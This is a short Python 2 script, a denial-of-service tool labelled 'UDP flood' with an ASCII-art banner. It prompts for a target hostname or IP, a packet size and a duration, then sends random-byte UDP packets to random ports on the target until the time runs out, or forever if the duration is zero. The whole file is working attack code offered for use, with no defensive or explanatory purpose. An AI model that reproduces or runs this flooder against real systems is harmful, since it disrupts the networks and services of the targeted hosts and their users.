import socket
import random
import sys
import time
import os
 
if sys.platform == "linux2":
        os.system("clear")
elif sys.platform == "win32":
        os.system("cls")
else:
        os.system("clear")
print("               _   _   _                     ")
print(" __      _____| |_| |_| |__   __ _ _ __ ___  ")
print(" \ \ /\ / / _ \ __| __| '_ \ / _` | '_ ` _ \ ")
print("  \ V  V /  __/ |_| |_| | | | (_| | | | | | |")
print("   \_/\_/ \___|\__|\__|_| |_|\__,_|_| |_| |_|")
print("")
print("")
target = raw_input("Target (Hostname or IP): ")
print("---")
package = input("Size (MAX 65500): ")
print("---")
duration = input("Duration (0 is infinite): ")
durclock = (lambda:0, time.clock)[duration > 0]
duration = (1, (durclock() + duration))[duration > 0]
packet = random._urandom(package)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print("---")
print("The UDP flood started on %s with %s bytes for %s seconds." % (target, package, duration))
while True:
        if (durclock() < duration):
                port = random.randint(1, 65535)
                sock.sendto(packet, (target, port))
        else:
                break
print("---")
print("The UDP flood has completed on %s for %s seconds." % (target, duration))